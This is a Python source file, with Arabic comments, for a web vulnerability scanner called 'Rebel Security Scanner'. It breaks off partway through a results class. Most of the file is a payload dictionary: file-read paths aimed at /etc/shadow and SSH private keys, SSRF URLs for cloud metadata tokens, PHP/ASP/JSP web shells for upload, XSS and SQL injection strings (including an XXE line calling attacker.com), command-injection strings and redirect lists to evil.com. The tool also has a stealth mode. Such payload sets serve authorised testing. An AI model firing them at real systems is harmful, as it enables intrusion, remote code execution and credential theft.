#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Rebel Security Scanner - النسخة النهائية المحسنة
أداة متقدمة لاكتشاف الثغرات الأمنية مع دعم كامل للغة العربية
"""

import argparse
import requests
import concurrent.futures
import os
import re
import json
import csv
import time
import random
import logging
import base64
import socket
import dns.resolver
import asyncio
import sqlite3
import subprocess
import jsbeautifier
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, urlparse, parse_qs, quote
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify
from tqdm import tqdm
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
from apscheduler.schedulers.background import BackgroundScheduler
from google.cloud import storage
import websockets

# تهيئة Colorama
init(autoreset=True)

# ===== إعدادات CLI =====
parser = argparse.ArgumentParser(description='Rebel Security Scanner - أداة متقدمة لكشف الثغرات')
parser.add_argument('--target', help='رابط الهدف (مثال: http://example.com)', required=True)
parser.add_argument('--scan', help='نوع الفحص (lfi, ssrf, upload, xss, sqli, headers, subdomain, rce, idor, redirect, csp, domxss, path_traversal, cmd_injection, cors, all)', default='all')
parser.add_argument('--output', help='ملف الإخراج (بدون ملحق)')
parser.add_argument('--format', help='تنسيق التقرير (json, csv, html)', default='json')
parser.add_argument('--aggressive', help='وضع عدواني (مستوى عالي)', action='store_true')
parser.add_argument('--wordlist', help='قائمة كلمات للمجالات الفرعية', default='subdomains.txt')
parser.add_argument('--cookie', help='كوكيز الجلسة (مثال: PHPSESSID=abc123)')
parser.add_argument('--auth', help='معلومات المصادقة (مثال: user:pass)')
parser.add_argument('--bearer', help='Bearer token للمصادقة (مثال: abc123)')
parser.add_argument('--proxy', help='بروكسي للاتصال (مثال: http://127.0.0.1:8080)')
parser.add_argument('--payloads', help='ملف حمولات مخصص')
parser.add_argument('--stealth', help='وضع التخفي (تباطؤ الطلبات)', action='store_true')
parser.add_argument('--threads', help='عدد الثريدات (افتراضي 10)', type=int, default=10)
parser.add_argument('--severity', help='تصفية النتائج حسب الخطورة (critical, high, medium, low)')
parser.add_argument('--webhook', help='رابط Discord Webhook')
parser.add_argument('--telegram', help='معرف Telegram Bot و Chat ID (مثال: bot_token:chat_id)')
parser.add_argument('--timeout', help='المهلة الزمنية للطلبات (ثواني)', type=int, default=15)
parser.add_argument('--nmap', help='تشغيل فحص Nmap', action='store_true')
parser.add_argument('--wpscan', help='تشغيل فحص WPScan للمواقع التي تستخدم ووردبريس', action='store_true')
parser.add_argument('--nikto', help='تشغيل فحص Nikto', action='store_true')
parser.add_argument('--gcloud-bucket', help='اسم bucket في Google Cloud لرفع التقارير')
parser.add_argument('--schedule', help='جدولة المسح (daily, weekly, monthly)')
args = parser.parse_args()

# ===== إعدادات المسح =====
TARGET_URL = args.target
AGGRESSIVE_MODE = args.aggressive
SCAN_TYPES = args.scan.split(',') if args.scan != 'all' else [
    'lfi', 'ssrf', 'upload', 'xss', 'sqli', 'headers', 'subdomain', 
    'rce', 'idor', 'redirect', 'csp', 'domxss', 'path_traversal',
    'cmd_injection', 'cors'
]
OUTPUT_FILE = args.output
OUTPUT_FORMAT = args.format
WORDLIST_FILE = args.wordlist
SEVERITY_FILTER = args.severity
THREADS = args.threads
STEALTH_MODE = args.stealth
TIMEOUT = args.timeout
PROXY = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
DISCORD_WEBHOOK = args.webhook
TELEGRAM_BOT = args.telegram
RUN_NMAP = args.nmap
RUN_WPSCAN = args.wpscan
RUN_NIKTO = args.nikto
GCLOUD_BUCKET = args.gcloud_bucket
SCHEDULE = args.schedule

# إعدادات بناءً على الوضع العدواني
if AGGRESSIVE_MODE:
    THREADS = min(THREADS * 2, 50)  # زيادة الثريدات مع حد أقصى 50
    TIMEOUT = max(2, TIMEOUT // 2)  # تقليل المهلة الزمنية

# إعداد الجلسة مع الكوكيز والمصادقة
session = requests.Session()
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
    'Connection': 'keep-alive'
}

if args.cookie:
    session.headers.update({'Cookie': args.cookie})

if args.auth:
    auth = base64.b64encode(args.auth.encode()).decode()
    session.headers.update({'Authorization': f'Basic {auth}'})

if args.bearer:
    session.headers.update({'Authorization': f'Bearer {args.bearer}'})

if PROXY:
    session.proxies = PROXY

# DNS resolver configuration
dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
dns.resolver.default_resolver.nameservers = ['8.8.8.8', '1.1.1.1']  # Google DNS + Cloudflare DNS

# ===== تحميل الحمولات =====
def load_payloads():
    """تحميل الحمولات من ملفات خارجية أو استخدام الافتراضية"""
    payloads = {
        "lfi": [
            "../../../../etc/passwd", "....//....//....//....//etc/passwd", r"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "/etc/shadow", "/var/www/html/config.php", "/proc/self/environ", "/etc/hosts",
            "/etc/group", "/etc/issue", "/etc/motd", "/etc/resolv.conf", "/etc/ssh/ssh_config",
            "/etc/ssh/sshd_config", "/etc/sudoers", "/etc/pam.conf", "/etc/security/pwquality.conf",
            "/var/log/auth.log", "/var/log/syslog", "/var/log/apache2/access.log",
            "/var/log/apache2/error.log", "/var/log/nginx/access.log", "/var/log/nginx/error.log",
            "/var/log/mysql/error.log", "/var/log/vsftpd.log", "/var/log/mail.log",
            "/var/log/secure", "/var/log/boot.log", "/var/log/dmesg", "/var/log/kern.log",
            "/var/log/yum.log", "/var/log/cron", "/var/log/btmp", "/var/log/wtmp", "/var/run/utmp",
            "/var/log/faillog", "/var/log/lastlog", "/var/log/tallylog", "/var/log/audit/audit.log",
            "/var/spool/cron/crontabs/root", "/var/spool/mail/root", "/root/.ssh/id_rsa",
            "/root/.ssh/authorized_keys", "/home/*/.ssh/id_rsa", "/home/*/.ssh/authorized_keys",
            "../../../../Windows/System32/drivers/etc/hosts", "../../../../Windows/win.ini",
            "../../../../Windows/System.ini", "../../../../boot.ini", "../../../../Windows/repair/sam",
            "../../../../Windows/Panther/unattend.xml", "../../../../Windows/Panther/unattended.xml",
            "../../../../Windows/debug/NetSetup.log", "../../../../Windows/system32/config/AppEvent.Evt",
            "../../../../Windows/system32/config/SecEvent.Evt", "../../../../Windows/system32/config/default.sav",
            "../../../../Windows/system32/config/security.sav", "../../../../Windows/system32/config/software.sav",
            "../../../../Windows/system32/config/system.sav", "../../../../Windows/system32/config/regback/default",
            "../../../../Windows/system32/config/regback/sam", "../../../../Windows/system32/config/regback/security",
            "../../../../Windows/system32/config/regback/system", "../../../../Windows/system32/config/regback/software",
            "../../../../Windows/ServiceProfiles/LocalService/ntuser.dat",
            "../../../../Windows/ServiceProfiles/NetworkService/ntuser.dat",
            "../../../../Program Files/MySQL/MySQL Server */my.ini", "../../../../Program Files (x86)/MySQL/MySQL Server */my.ini",
            "../../../../xampp/apache/conf/httpd.conf", "../../../../xampp/apache/conf/extra/httpd-vhosts.conf",
            "../../../../xampp/apache/logs/access.log", "../../../../xampp/apache/logs/error.log",
            "../../../../xampp/filezillaftp/filezilla server.xml", "../../../../xampp/mercurymail/Mercury.ini",
            "../../../../xampp/php/php.ini", "../../../../xampp/security/webdav.htpasswd",
            "../../../../xampp/sendmail/sendmail.ini", "../../../../xampp/webalizer/webalizer.conf"
        ],
        "ssrf": [
            "http://169.254.169.254/latest/meta-data", "file:///etc/passwd", "gopher://127.0.0.1:22/",
            "http://localhost", "http://127.0.0.1", "http://0.0.0.0", "http://[::1]", "http://internal",
            "http://intranet", "http://192.168.0.1", "http://10.0.0.1", "http://172.16.0.1", "http://127.0.0.1:22",
            "http://127.0.0.1:80", "http://127.0.0.1:443", "http://127.0.0.1:8080", "http://127.0.0.1:3306",
            "http://127.0.0.1:5432", "http://127.0.0.1:6379", "http://127.0.0.1:9200", "http://127.0.0.1:11211",
            "dict://127.0.0.1:6379/info", "ftp://127.0.0.1:21", "ldap://127.0.0.1:389", "tftp://127.0.0.1:69",
            "sftp://127.0.0.1:22", "telnet://127.0.0.1:23", "rmi://127.0.0.1:1099", "jar:http://127.0.0.1:8080/",
            "phar://127.0.0.1:8080/", "expect://id", "ssh://root@127.0.0.1", "redis://127.0.0.1:6379",
            "zlib://127.0.0.1", "ogg://127.0.0.1", "data://text/plain;base64,dGVzdA==", "http://metadata.google.internal/computeMetadata/v1beta1/",
            "http://metadata.google.internal/computeMetadata/v1/", "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
            "http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "http://metadata.google.internal/0.1/meta-data", "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys",
            "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
            "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/?recursive=true",
            "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true"
        ],
        "upload": [
            ("shell.php", "<?php system($_GET['cmd']); ?>"), 
            ("shell.php5", "<?php system($_GET['cmd']); ?>"),
            ("shell.phtml", "<?php system($_GET['cmd']); ?>"),
            ("shell.jpg.php", "<?php system($_GET['cmd']); ?>"),
            ("shell.php.jpg", "<?php system($_GET['cmd']); ?>"),
            ("shell.asp", "<% Execute(Request(\"cmd\")) %>"),
            ("shell.aspx", "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>"),
            ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
            ("shell.jspx", "<jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter(\"cmd\"));</jsp:scriptlet>"),
            ("shell.js", "require('child_process').exec(req.query.cmd)"),
            ("test.png", "PNG fake header"),
            ("test.jpg", "JPG fake header"),
            ("test.gif", "GIF89a fake header"),
            ("test.pdf", "%PDF-1.4 fake header"),
            ("test.zip", "PK\x03\x04 fake header"),
            ("test.tar", "ustar fake header"),
            ("test.gz", "\x1f\x8b fake header"),
            ("test.xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"),
            ("test.json", "{\"test\": \"value\"}")
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<a href=javascript:alert('XSS')>Click</a>",
            "<form action=javascript:alert('XSS')><input type=submit>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<input type=text value=`` onfocus=alert('XSS') autofocus>",
            "<marquee onscroll=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=1 onerror=alert('XSS')>",
            "<details ontoggle=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen autofocus onfocus=alert('XSS')>",
            "<math href=javascript:alert('XSS')>CLICKME</math>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<applet code=javascript:alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"
        ],
        "sqli": [
            "' OR 1=1-- -",
            "' OR SLEEP(5)-- -",
            "\" OR \"a\"=\"a",
            "' OR 'a'='a",
            "') OR ('a'='a",
            "'; WAITFOR DELAY '0:0:5'--",
            "\" OR 1=1-- -",
            "' OR 1=1#",
            "\" OR 1=1#",
            "' OR 1=1/*",
            "\" OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' UNION SELECT null,username,password FROM users-- -",
            "' UNION SELECT null,table_name,null FROM information_schema.tables-- -",
            "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'-- -",
            "'; EXEC xp_cmdshell('dir')-- -",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')-- -",
            "' OR (SELECT LOAD_FILE('/etc/passwd'))-- -",
            "' OR (SELECT @@version)-- -",
            "' OR (SELECT database())-- -",
            "' OR (SELECT user())-- -",
            "' OR (SELECT current_user())-- -",
            "' OR (SELECT current_setting('is_superuser'))-- -",
            "' OR (SELECT pg_sleep(5))-- -",
            "' OR (SELECT BENCHMARK(1000000,MD5('test')))-- -",
            "' OR (SELECT LOAD_FILE(0x2F6574632F706173737764))-- -",
            "' OR (SELECT sys_context('USERENV','CURRENT_USER'))-- -",
            "' OR (SELECT UTL_INADDR.get_host_address('google.com'))-- -",
            "' OR (SELECT DBMS_LDAP.INIT('oracle.com',389))-- -",
            "' OR (SELECT HTTPURITYPE('http://google.com').getclob())-- -",
            "' OR (SELECT XMLType('<?xml version=\"1.0\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\"> %remote; %int; %trick;]>'))-- -"
        ],
        "rce": [
            ";id",
            "|id",
            "`id`",
            "$(id)",
            "||id",
            "&&id",
            "id;",
            "id|",
            "id&",
            "id%0a",
            "id%0d",
            "id%00",
            "id%20",
            "id%09",
            "id%0b",
            "id%0c",
            "id%0e",
            "id%0f",
            "id%ff",
            "id%0a%0d",
            "id%0d%0a",
            "id%0a%0a",
            "id%0d%0d",
            "id%0a%20",
            "id%0d%20",
            "id%20%0a",
            "id%20%0d",
            "id%0a%09",
            "id%0d%09",
            "id%09%0a",
            "id%09%0d",
            "id%0a%0b",
            "id%0d%0b",
            "id%0b%0a",
            "id%0b%0d",
            "id%0a%0c",
            "id%0d%0c",
            "id%0c%0a",
            "id%0c%0d",
            "id%0a%0e",
            "id%0d%0e",
            "id%0e%0a",
            "id%0e%0d",
            "id%0a%0f",
            "id%0d%0f",
            "id%0f%0a",
            "id%0f%0d",
            "id%0a%ff",
            "id%0d%ff",
            "id%ff%0a",
            "id%ff%0d",
            "id%0a%00",
            "id%0d%00",
            "id%00%0a",
            "id%00%0d",
            "id%0a%20%0a",
            "id%0d%20%0d",
            "id%20%0a%20",
            "id%20%0d%20",
            "id%0a%09%0a",
            "id%0d%09%0d",
            "id%09%0a%09",
            "id%09%0d%09",
            "id%0a%0b%0a",
            "id%0d%0b%0d",
            "id%0b%0a%0b",
            "id%0b%0d%0b",
            "id%0a%0c%0a",
            "id%0d%0c%0d",
            "id%0c%0a%0c",
            "id%0c%0d%0c",
            "id%0a%0e%0a",
            "id%0d%0e%0d",
            "id%0e%0a%0e",
            "id%0e%0d%0e",
            "id%0a%0f%0a",
            "id%0d%0f%0d",
            "id%0f%0a%0f",
            "id%0f%0d%0f",
            "id%0a%ff%0a",
            "id%0d%ff%0d",
            "id%ff%0a%ff",
            "id%ff%0d%ff",
            "id%0a%00%0a",
            "id%0d%00%0d",
            "id%00%0a%00",
            "id%00%0d%00"
        ],
        "idor": [
            "../admin/users",
            "../../config",
            "/api/v1/users/1",
            "/admin",
            "/admin/dashboard",
            "/admin/users",
            "/admin/configuration",
            "/admin/settings",
            "/admin/backup",
            "/admin/logs",
            "/admin/database",
            "/admin/plugins",
            "/admin/themes",
            "/admin/tools",
            "/wp-admin",
            "/wp-admin/users.php",
            "/wp-admin/options-general.php",
            "/wp-admin/plugin-editor.php",
            "/wp-admin/theme-editor.php",
            "/wp-admin/export.php",
            "/phpmyadmin",
            "/phpMyAdmin",
            "/pma",
            "/mysql",
            "/dbadmin",
            "/administrator",
            "/manager",
            "/webadmin",
            "/adminpanel",
            "/user/admin",
            "/config.json",
            "/config.php",
            "/configuration.php",
            "/.env",
            "/.git/config",
            "/.svn/entries",
            "/.htaccess",
            "/.htpasswd",
            "/robots.txt",
            "/sitemap.xml",
            "/crossdomain.xml",
            "/clientaccesspolicy.xml",
            "/package.json",
            "/composer.json",
            "/yarn.lock",
            "/package-lock.json",
            "/Gemfile",
            "/Gemfile.lock",
            "/pom.xml",
            "/build.xml",
            "/Dockerfile",
            "/docker-compose.yml",
            "/docker-compose.yaml",
            "/dockerfile",
            "/docker-compose",
            "/dockerfile.yml",
            "/dockerfile.yaml",
            "/Vagrantfile",
            "/vagrantfile",
            "/ansible.cfg",
            "/playbook.yml",
            "/playbook.yaml",
            "/inventory",
            "/inventory.ini",
            "/inventory.yml",
            "/inventory.yaml",
            "/requirements.txt",
            "/requirements.pip",
            "/Pipfile",
            "/Pipfile.lock",
            "/setup.py",
            "/MANIFEST.in",
            "/__init__.py",
            "/app.py",
            "/main.py",
            "/server.py",
            "/index.php",
            "/index.html",
            "/index.jsp",
            "/index.aspx",
            "/default.aspx",
            "/global.asax",
            "/web.config",
            "/.idea/workspace.xml",
            "/.idea/misc.xml",
            "/.idea/modules.xml",
            "/.idea/compiler.xml",
            "/.idea/libraries",
            "/.vscode/settings.json",
            "/.vscode/launch.json",
            "/.vscode/tasks.json",
            "/.DS_Store",
            "/Thumbs.db",
            "/desktop.ini",
            "/~$"
        ],
        "redirect": [
            "https://evil.com",
            "//evil.com",
            "javascript:alert(1)",
            "http://attacker.com",
            "http://malicious.com",
            "http://phishing.com",
            "http://hacker.com",
            "http://exploit.com",
            "http://bad.com",
            "http://danger.com",
            "http://malware.com",
            "http://trojan.com",
            "http://virus.com",
            "http://spyware.com",
            "http://adware.com",
            "http://keylogger.com",
            "http://ransomware.com",
            "http://backdoor.com",
            "http://rootkit.com",
            "http://botnet.com",
            "http://worm.com",
            "http://spam.com",
            "http://scam.com",
            "http://fraud.com",
            "http://fake.com",
            "http://clone.com",
            "http://mirror.com",
            "http://proxy.com",
            "http://vpn.com",
            "http://tor.com",
            "http://i2p.com",
            "http://freenet.com",
            "http://zeronet.com",
            "http://onion.com",
            "http://darknet.com",
            "http://deepweb.com",
            "http://hidden.com",
            "http://secret.com",
            "http://private.com",
            "http://secure.com",
            "http://safety.com",
            "http://trust.com",
            "http://verify.com",
            "http://login.com",
            "http://signin.com",
            "http://register.com",
            "http://signup.com",
            "http://account.com",
            "http://profile.com",
            "http://settings.com",
            "http://preferences.com",
            "http://configuration.com",
            "http://setup.com",
            "http://install.com",
            "http://update.com",
            "http://upgrade.com",
            "http://download.com",
            "http://upload.com",
            "http://file.com",
            "http://data.com",
            "http://info.com",
            "http://details.com",
            "http://personal.com",
            "http://privateinfo.com",
            "http://confidential.com",
            "http://sensitive.com",
            "http://classified.com",
            "http://topsecret.com",
            "http://restricted.com",
            "http://internal.com",
            "http://intranet.com",
            "http://local.com",
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://::1",
            "http://0000::1",
            "http://fe80::1",
            "http://::",
            "http://0",
            "http://1",
            "http://2",
            "http://3",
            "http://4",
            "http://5",
            "http://6",
            "http://7",
            "http://8",
            "http://9",
            "http://10",
            "http://11",
            "http://12",
            "http://13",
            "http://14",
            "http://15",
            "http://16",
            "http://17",
            "http://18",
            "http://19",
            "http://20",
            "http://21",
            "http://22",
            "http://23",
            "http://24",
            "http://25",
            "http://26",
            "http://27",
            "http://28",
            "http://29",
            "http://30",
            "http://31",
            "http://32",
            "http://33",
            "http://34",
            "http://35",
            "http://36",
            "http://37",
            "http://38",
            "http://39",
            "http://40",
            "http://41",
            "http://42",
            "http://43",
            "http://44",
            "http://45",
            "http://46",
            "http://47",
            "http://48",
            "http://49",
            "http://50",
            "http://51",
            "http://52",
            "http://53",
            "http://evil.com\@target.com",
            "http://target.com@evil.com",
            "http://evil.com\\target.com",
            "http://evil.com\/target.com",
            "http://evil.com?target.com",
            "http://evil.com#target.com"
        ],
        "csp": [
            "<script>alert('CSP Bypass')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<link rel='preload' href='https://evil.com/exploit'>",
            "<meta http-equiv='refresh' content='0; url=https://evil.com'>",
            "<base href='https://evil.com/'>",
            "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
            "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<math><brute href='javascript:alert(1)'>CLICK</brute></math>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><animate onbegin='alert(1)' attributeName='x' values='0;100'></animate></svg>",
            "<svg><a xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='javascript:alert(1)'><rect width='100' height='100' fill='red'/></a></svg>",
            "<style>@import 'https://evil.com/exploit.css';</style>",
            "<style>body{background-image:url('https://evil.com/exploit')}</style>",
            "<style>body{-webkit-animation: x;}</style><link rel='stylesheet' href='data:text/css,@keyframes x{from{background:red}to{background:url(https://evil.com)}'>"
        ],
        "headers": [
            "Content-Security-Policy",
            "X-Frame-Options",
            "Strict-Transport-Security",
            "X-XSS-Protection",
            "X-Content-Type-Options",
            "Referrer-Policy",
            "Feature-Policy",
            "Permissions-Policy",
            "Expect-CT",
            "Public-Key-Pins",
            "X-Permitted-Cross-Domain-Policies",
            "Access-Control-Allow-Origin",
            "Access-Control-Allow-Credentials",
            "Access-Control-Allow-Methods",
            "Access-Control-Allow-Headers",
            "Access-Control-Expose-Headers",
            "Access-Control-Max-Age",
            "Access-Control-Request-Method",
            "Access-Control-Request-Headers",
            "Cross-Origin-Resource-Policy",
            "Cross-Origin-Embedder-Policy",
            "Cross-Origin-Opener-Policy",
            "X-Download-Options",
            "X-Powered-By",
            "Server",
            "Via",
            "X-AspNet-Version",
            "X-AspNetMvc-Version",
            "X-PHP-Version",
            "X-Runtime",
            "X-Version",
            "X-Request-ID",
            "X-Correlation-ID",
            "X-Forwarded-For",
            "X-Forwarded-Host",
            "X-Forwarded-Proto",
            "X-Real-IP",
            "X-Client-IP",
            "X-Host",
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Forwarded-Server",
            "X-ATT-DeviceId",
            "X-Wap-Profile",
            "Proxy-Connection",
            "Upgrade-Insecure-Requests",
            "DNT",
            "P3P",
            "Cache-Control",
            "Pragma",
            "Expires",
            "ETag",
            "Last-Modified",
            "Accept-Ranges",
            "Content-Length",
            "Content-Type",
            "Content-Encoding",
            "Content-Disposition",
            "Content-Language",
            "Location",
            "Refresh",
            "Set-Cookie",
            "Cookie",
            "WWW-Authenticate",
            "Proxy-Authenticate",
            "Authorization",
            "Proxy-Authorization"
        ],
        "path_traversal": [
            "../../../../etc/passwd",
            "....//....//....//....//windows/win.ini",
            r"..%2F..%2F..%2F..%2Fboot.ini",
            "..\\..\\..\\..\\windows\\system.ini",
            "..%255c..%255c..%255c..%255cboot.ini",
            "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%u2215..%u2215..%u2215..%u2215etc/passwd",
            "..%252f..%252f..%252f..%252fetc/passwd",
            "..%c1%9c..%c1%9c..%c1%9c..%c1%9cboot.ini",
            "..%c0%9v..%c0%9v..%c0%9v..%c0%9vboot.ini",
            "..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini",
            "..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows/system.ini",
            "..%c0%9v..%c0%9v..%c0%9v..%c0%9vwindows/system.ini",
            "..%u2216..%u2216..%u2216..%u2216windows/system.ini",
            "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows/system.ini",
            "..%5c..%5c..%5c..%5cwindows/system.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
            "..////..////..////..////etc/passwd",
            "../../../../../../../../../../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
            "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd",
            "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cboot.ini",
            "..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9vboot.ini",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini",
            "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows/system.ini",
            "..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9vwindows/system.ini",
            "..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216windows/system.ini",
            "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows/system.ini",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/system.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
            "../../../../../../../../../../../../../../windows/system.ini"
        ],
        "cmd_injection": [
            "; ls",
            "&& whoami",
            "| dir",
            "`echo REBEL`",
            "$(echo REBEL)",
            "|| id",
            "&& id",
            "| id",
            "; id",
            "`id`",
            "$(id)",
            "id;",
            "id|",
            "id&",
            "id%0a",
            "id%0d",
            "id%00",
            "id%20",
            "id%09",
            "id%0b",
            "id%0c",
            "id%0e",
            "id%0f",
            "id%ff",
            "id%0a%0d",
            "id%0d%0a",
            "id%0a%0a",
            "id%0d%0d",
            "id%0a%20",
            "id%0d%20",
            "id%20%0a",
            "id%20%0d",
            "id%0a%09",
            "id%0d%09",
            "id%09%0a",
            "id%09%0d",
            "id%0a%0b",
            "id%0d%0b",
            "id%0b%0a",
            "id%0b%0d",
            "id%0a%0c",
            "id%0d%0c",
            "id%0c%0a",
            "id%0c%0d",
            "id%0a%0e",
            "id%0d%0e",
            "id%0e%0a",
            "id%0e%0d",
            "id%0a%0f",
            "id%0d%0f",
            "id%0f%0a",
            "id%0f%0d",
            "id%0a%ff",
            "id%0d%ff",
            "id%ff%0a",
            "id%ff%0d",
            "id%0a%00",
            "id%0d%00",
            "id%00%0a",
            "id%00%0d",
            "id%0a%20%0a",
            "id%0d%20%0d",
            "id%20%0a%20",
            "id%20%0d%20",
            "id%0a%09%0a",
            "id%0d%09%0d",
            "id%09%0a%09",
            "id%09%0d%09",
            "id%0a%0b%0a",
            "id%0d%0b%0d",
            "id%0b%0a%0b",
            "id%0b%0d%0b",
            "id%0a%0c%0a",
            "id%0d%0c%0d",
            "id%0c%0a%0c",
            "id%0c%0d%0c",
            "id%0a%0e%0a",
            "id%0d%0e%0d",
            "id%0e%0a%0e",
            "id%0e%0d%0e",
            "id%0a%0f%0a",
            "id%0d%0f%0d",
            "id%0f%0a%0f",
            "id%0f%0d%0f",
            "id%0a%ff%0a",
            "id%0d%ff%0d",
            "id%ff%0a%ff",
            "id%ff%0d%ff",
            "id%0a%00%0a",
            "id%0d%00%0d",
            "id%00%0a%00",
            "id%00%0d%00"
        ]
    }

    # تحميل حمولات مخصصة إذا تم توفيرها
    if args.payloads:
        try:
            with open(args.payloads, 'r', encoding='utf-8') as f:
                custom_payloads = json.load(f)
                for key in custom_payloads:
                    if key in payloads:
                        payloads[key].extend(custom_payloads[key])
        except Exception as e:
            print(f"{Fore.RED}[-] فشل في تحميل الحمولات المخصصة: {str(e)}{Style.RESET_ALL}")

    return payloads

PAYLOAD_DICT = load_payloads()

# ===== فئات النتائج =====
class ScanResult:
    def __init__(self, target):
        self.target = target  # إضافة الهدف هنا
        self.vulnerabilities = []
        self.subdomains = []
        self.security_headers = {}
        self.scan_time = time.strftime("%Y-%m-%d %H:%M:%S")
        self.total_requests = 0
        self.scan_duration = 0
        self.critical_count = 0
        self.high_count = 0
        self.medium_count = 0
        self.low_count = 0
        self.hidden_endpoints = []
        self.nmap_results = ""
        self.wpscan_results = ""
        self.nikto_results = ""
        self.js_analysis = []
    
    def add_vulnerability(self, type, location, payload, severity, method="GET", confidence="high"):
        self.vulnerabilities.append({
            "type": type,
            "location": location,
            "payload": payload,
            "severity": severity,
            "method": method,
            "confidence": confidence,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        })
        
        # تحديث العدادات
        if severity == "critical":
            self.critical_count += 1
        elif severity == "high":
            self.high_count += 1
        elif severity == "medium":
            self.medium_count += 1
        elif severity == "low":
            self.low_count += 1
    
    def add_subdomain(self, subdomain):
        self.subdomains.append(subdomain)
    
    def set_headers(self, headers):
        self.security_headers = headers
    
    def add_hidden_endpoint(self, endpoint):
        self.hidden_endpoints.append(endpoint)
    
    def set_nmap_results(self, results):
        self.nmap_results = results
    
    def set_wpscan_results(self, results):
        self.wpscan_results = results
    
    def set_nikto_results(self, results):
        self.nikto_results = results
    
    def add_js_analysis(self, analysis):
        self.js_analysis.append(analysis)
    
    def filtered_vulnerabilities(self):
